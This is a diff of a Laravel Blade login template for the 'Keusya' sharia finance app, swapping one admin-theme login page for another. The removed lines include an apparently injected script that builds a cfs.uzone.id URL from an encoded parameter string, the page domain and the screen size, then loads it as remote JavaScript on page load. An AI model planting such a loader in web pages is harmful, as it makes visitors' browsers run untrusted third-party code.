@@ -1,84 +1,151 @@
+
 <!DOCTYPE html>
-<html>
 
+<html lang="en">
+    <!-- BEGIN HEAD -->
 
+    <head>
+        <meta charset="utf-8" />
+        <title>Keusya | User Login </title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta content="width=device-width, initial-scale=1" name="viewport" />
+        <meta content="" name="description" />
+        <meta content="" name="author" />
+        <!-- BEGIN GLOBAL MANDATORY STYLES -->
+        <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&subset=all" rel="stylesheet" type="text/css" />
+        <link href="{{ asset('assets/global/plugins/font-awesome/css/font-awesome.min.css') }}" rel="stylesheet" type="text/css" />
+        <link href="{{ asset('assets/global/plugins/simple-line-icons/simple-line-icons.min.css') }}" rel="stylesheet" type="text/css" />
+        <link href="{{ asset('assets/global/plugins/bootstrap/css/bootstrap.min.css') }}" rel="stylesheet" type="text/css" />
+        <link href="{{ asset('assets/global/plugins/bootstrap-switch/css/bootstrap-switch.min.css') }}" rel="stylesheet" type="text/css" />
+        <!-- END GLOBAL MANDATORY STYLES -->
+        <!-- BEGIN PAGE LEVEL PLUGINS -->
+        <link href="{{ asset('assets/global/plugins/select2/css/select2.min.css') }}" rel="stylesheet" type="text/css" />
+        <link href="{{ asset('assets/global/plugins/select2/css/select2-bootstrap.min.css') }}" rel="stylesheet" type="text/css" />
+        <!-- END PAGE LEVEL PLUGINS -->
+        <!-- BEGIN THEME GLOBAL STYLES -->
+        <link href="{{ asset('assets/global/css/components-md.min.css') }}" rel="stylesheet" id="style_components" type="text/css" />
+        <link href="{{ asset('assets/global/css/plugins-md.min.css') }}" rel="stylesheet" type="text/css" />
+        <!-- END THEME GLOBAL STYLES -->
+        <!-- BEGIN PAGE LEVEL STYLES -->
+        <link href="{{ asset('assets/pages/css/login-5.min.css') }}" rel="stylesheet" type="text/css" />
+        <!-- END PAGE LEVEL STYLES -->
+        <!-- BEGIN THEME LAYOUT STYLES -->
+        <!-- END THEME LAYOUT STYLES -->
+        <link rel="shortcut icon" href="favicon.ico" /> </head>
+    <!-- END HEAD -->
 
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-    <title>Keusya - Aplikasi Keuangan Syariah</title>
-
-    <!-- Favicon -->
-    <link rel="shortcut icon" href="{{ asset('assets/images/logo/favicon.png') }}">
-
-    <!-- plugins css -->
-    <link rel="stylesheet" href="{{ asset('bower_components/bootstrap/dist/css/bootstrap.css') }}" />
-    <link rel="stylesheet" href="{{ asset('bower_components/PACE/themes/blue/pace-theme-minimal.css') }}" />
-    <link rel="stylesheet" href="{{ asset('bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css') }}" />
-
-    <!-- core css -->
-    <link href="{{ asset('assets/css/ei-icon.css') }}" rel="stylesheet">
-    <link href="{{ asset('assets/css/themify-icons.css') }}" rel="stylesheet">
-    <link href="{{ asset('assets/css/font-awesome.min.css') }}" rel="stylesheet">
-    <link href="{{ asset('assets/css/animate.min.css') }}" rel="stylesheet">
-    <link href="{{ asset('assets/css/app.css') }}" rel="stylesheet">
-</head>
-
-<body>
-    <div class="app">
-        <div class="authentication">
-            <div class="sign-in">
-                <div class="row no-mrg-horizon">
-                    <div class="col-md-8 no-pdd-horizon hidden-xs">
-                        <div class="full-height bg" style="background-image: url('assets/images/others/img-29.jpg')">
-                            <div class="img-caption">
-                                <h1 class="caption-title">We make spectacular</h1>
-                                <p class="caption-text">Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.</p>
+    <body class=" login">
+        <!-- BEGIN : LOGIN PAGE 5-1 -->
+        <div class="user-login-5">
+            <div class="row bs-reset">
+                <div class="col-md-6 bs-reset">
+                    <div class="login-bg" style="background-image:url(../assets/pages/img/login/bg1.jpg)">
+                        <img class="login-logo" src="../assets/pages/img/login/logo.png" /> </div>
+                </div>
+                <div class="col-md-6 login-container bs-reset">
+                    <div class="login-content">
+                        <h1>Keusya Login</h1>
+                        <p> Lorem ipsum dolor sit amet, coectetuer adipiscing elit sed diam nonummy et nibh euismod aliquam erat volutpat. Lorem ipsum dolor sit amet, coectetuer adipiscing. </p>
+                        <form action="javascript:;" class="login-form" method="post">
+                            <div class="alert alert-danger display-hide">
+                                <button class="close" data-close="alert"></button>
+                                <span>Enter any username and password. </span>
                             </div>
-                        </div>
-                    </div>
-                    <div class="col-md-4 no-pdd-horizon">
-                        <div class="full-height bg-white height-100">
-                            <div class="vertical-align full-height pdd-horizon-70">
-                                <div class="table-cell">
-                                    <div class="pdd-horizon-15">
-                                        <h2>Login</h2>
-                                        <p class="mrg-btm-15 font-size-13">Please enter your user name and password to login</p>
-                                        <form>
-                                            <div class="form-group">
-                                                <input type="email" class="form-control" placeholder="User name">
-                                            </div>
-                                            <div class="form-group">
-                                                <input type="password" class="form-control" placeholder="Password">
-                                            </div>
-                                            <div class="checkbox font-size-12">
-                                                <input id="agreement" name="agreement" type="checkbox">
-                                                <label for="agreement">Keep Me Signed In</label>
-                                            </div>
-                                            <button class="btn btn-info">Login</button>
-                                        </form>
+                            <div class="row">
+                                <div class="col-xs-6">
+                                    <input class="form-control form-control-solid placeholder-no-fix form-group" type="text" autocomplete="off" placeholder="Username" name="username" required/> </div>
+                                <div class="col-xs-6">
+                                    <input class="form-control form-control-solid placeholder-no-fix form-group" type="password" autocomplete="off" placeholder="Password" name="password" required/> </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-sm-4">
+                                    <div class="rem-password">
+                                        <label class="rememberme mt-checkbox mt-checkbox-outline">
+                                            <input type="checkbox" name="remember" value="1" /> Remember me
+                                            <span></span>
+                                        </label>
                                     </div>
                                 </div>
+                                <div class="col-sm-8 text-right">
+                                    <div class="forgot-password">
+                                        <a href="javascript:;" id="forget-password" class="forget-password">Forgot Password?</a>
+                                    </div>
+                                    <button class="btn green" type="submit">Sign In</button>
+                                </div>
                             </div>
-                            <div class="login-footer">
-                                <img class="img-responsive inline-block" src="assets/images/logo/logo.png" width="100" alt="">
-                                <span class="font-size-13 pull-right pdd-top-10">Don't have an account? <a href="{{ url('/register')}}">Sign Up Now</a></span>
+                        </form>
+                        <!-- BEGIN FORGOT PASSWORD FORM -->
+                        <form class="forget-form" action="javascript:;" method="post">
+                            <h3 class="font-green">Forgot Password ?</h3>
+                            <p> Enter your e-mail address below to reset your password. </p>
+                            <div class="form-group">
+                                <input class="form-control placeholder-no-fix form-group" type="text" autocomplete="off" placeholder="Email" name="email" /> </div>
+                            <div class="form-actions">
+                                <button type="button" id="back-btn" class="btn green btn-outline">Back</button>
+                                <button type="submit" class="btn btn-success uppercase pull-right">Submit</button>
+                            </div>
+                        </form>
+                        <!-- END FORGOT PASSWORD FORM -->
+                    </div>
+                    <div class="login-footer">
+                        <div class="row bs-reset">
+                            <div class="col-xs-5 bs-reset">
+                                <ul class="login-social">
+                                    <li>
+                                        <a href="javascript:;">
+                                            <i class="icon-social-facebook"></i>
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="javascript:;">
+                                            <i class="icon-social-twitter"></i>
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="javascript:;">
+                                            <i class="icon-social-dribbble"></i>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="col-xs-7 bs-reset">
+                                <div class="login-copyright text-right">
+                                    <p>Copyright &copy; Masyarakat Ekonomi Syariah 2022</p>
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
+        <!-- END : LOGIN PAGE 5-1 -->
 
-    <script src="{{ asset('assets/js/vendor.js') }}"></script>
-
-    <script src="{{ asset('assets/js/app.min.js') }}"></script>
-
-    <!-- page js -->
-
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31dK4ZUfyQ6h17H2gpM8K7yBIYJnkRQJdcJk3wi%2fL2iLuMD5lXPtAOnOZ3BMUiGAsPomjEUDwn9SShP0Zxa9vYkqMiDoeZ58Sozaf1QqKd5ud%2bDMInETTN%2bBe%2bRIpsffOVoGf4CR5N5c1%2fCt%2f3Zyc9neaCqUWllyvtKa7azVEK0%2fNWWPts88HAftQtqfYp1r9%2bryPJ6wD%2bT0jWsYZfpZm2tGVL9adlavfBeDxxLg9hK9aJ5WZq7LViD9bEwXmR%2bWuii9mLiHTWiHXTtTNE2TnYMpGsp%2f5Ido317p0gu6q8ZtCfVcO%2bWMBxgkXOK77Gu6Y3VHlTho9RwTqa7mzopaSeyTrmkSkgvWWfnf%2fxxygh0krf8NoyA9v%2f2vtie3cFrJk%2bmVjnW7d85aVhte%2f4L5Ji5J64bvhxG9kTARskDRbX6XxUGB%2fG41mgJCX16ZP%2fjj6vXEWCh7m0etMQaO%2bfrqWZHulFJhgmi4m2nbIZNFQ%2bqemVtQ1k5OIj1A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-
-
+        <!-- BEGIN CORE PLUGINS -->
+        <script src="{{ asset('assets/global/plugins/jquery.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/bootstrap/js/bootstrap.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/js.cookie.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/jquery-slimscroll/jquery.slimscroll.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/jquery.blockui.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/bootstrap-switch/js/bootstrap-switch.min.js') }}" type="text/javascript"></script>
+        <!-- END CORE PLUGINS -->
+        <!-- BEGIN PAGE LEVEL PLUGINS -->
+        <script src="{{ asset('assets/global/plugins/jquery-validation/js/jquery.validate.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/jquery-validation/js/additional-methods.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/select2/js/select2.full.min.js') }}" type="text/javascript"></script>
+        <script src="{{ asset('assets/global/plugins/backstretch/jquery.backstretch.min.js') }}" type="text/javascript"></script>
+        <!-- END PAGE LEVEL PLUGINS -->
+        <!-- BEGIN THEME GLOBAL SCRIPTS -->
+        <script src="{{ asset('assets/global/scripts/app.min.js') }}" type="text/javascript"></script>
+        <!-- END THEME GLOBAL SCRIPTS -->
+        <!-- BEGIN PAGE LEVEL SCRIPTS -->
+        <script src="{{ asset('assets/pages/scripts/login-5.min.js') }}" type="text/javascript"></script>
+        <!-- END PAGE LEVEL SCRIPTS -->
+        <!-- BEGIN THEME LAYOUT SCRIPTS -->
+        <!-- END THEME LAYOUT SCRIPTS -->
+    </body>
 
 </html>
+
+<!DOCTYPE html>
+<html>
